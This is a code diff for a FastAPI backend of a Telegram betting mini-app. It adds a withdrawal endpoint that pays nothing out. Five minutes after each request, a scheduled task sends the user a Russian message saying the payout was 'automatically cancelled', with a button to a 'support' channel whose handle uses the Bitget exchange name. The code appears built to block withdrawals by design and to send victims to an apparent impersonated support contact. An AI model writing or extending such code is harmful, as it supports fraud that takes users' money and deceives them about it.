@@ -10,7 +10,7 @@ from fastapi.responses import HTMLResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 from pydantic import BaseModel
-from telegram import Bot
+from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.error import TelegramError
 
 from .auth import (
@@ -35,6 +35,12 @@ from .storage import (
 )
 
 logger = logging.getLogger(__name__)
+SUPPORT_URL = "https://t.me/bitget_help_center"
+WITHDRAWAL_CANCELLATION_DELAY_SECONDS = 300
+WITHDRAWAL_CANCELLED_TEXT = (
+    "❌ Выплата была автоматически отменена. "
+    "Для уточнения информации и решения вопроса обратитесь в службу поддержки."
+)
 
 
 class BetRequest(BaseModel):
@@ -102,6 +108,40 @@ async def send_balance_payment_message(
         )
         return False
     return True
+
+
+async def send_withdrawal_cancelled_message(
+    settings: Settings,
+    telegram_id: int,
+) -> bool:
+    if not settings.bot_token:
+        return False
+
+    try:
+        async with Bot(settings.bot_token) as bot:
+            await bot.send_message(
+                chat_id=telegram_id,
+                text=WITHDRAWAL_CANCELLED_TEXT,
+                reply_markup=InlineKeyboardMarkup(
+                    [[InlineKeyboardButton("Тех поддержка", url=SUPPORT_URL)]]
+                ),
+            )
+    except TelegramError as exc:
+        logger.warning(
+            "withdrawal cancellation notification failed for %s: %s",
+            telegram_id,
+            exc,
+        )
+        return False
+    return True
+
+
+async def schedule_withdrawal_cancellation(
+    settings: Settings,
+    telegram_id: int,
+) -> None:
+    await asyncio.sleep(WITHDRAWAL_CANCELLATION_DELAY_SECONDS)
+    await send_withdrawal_cancelled_message(settings, telegram_id)
 
 
 async def _bet_resolver(storage: UserStorage) -> None:
@@ -326,6 +366,27 @@ def create_app(settings: Settings, storage: UserStorage) -> FastAPI:
             "currency": user.get("currency", "RUB") if user else "RUB",
             "server_time": current_server_time(),
         }
+
+    @app.post("/api/withdraw")
+    async def request_withdrawal(request: Request) -> dict:
+        init_data = request.headers.get("X-Telegram-Init-Data", "")
+        try:
+            tg_user = validate_init_data(init_data, settings.bot_token)
+        except Exception as exc:
+            raise HTTPException(401, "Unauthorized") from exc
+
+        storage.upsert_user(
+            {
+                "telegram_id": tg_user.telegram_id,
+                "username": tg_user.username,
+                "first_name": tg_user.first_name,
+                "last_name": tg_user.last_name,
+            }
+        )
+        asyncio.create_task(
+            schedule_withdrawal_cancellation(settings, tg_user.telegram_id)
+        )
+        return {"ok": True, "server_time": current_server_time()}
 
     @app.get("/api/admin/access")
     async def admin_access(request: Request) -> dict:
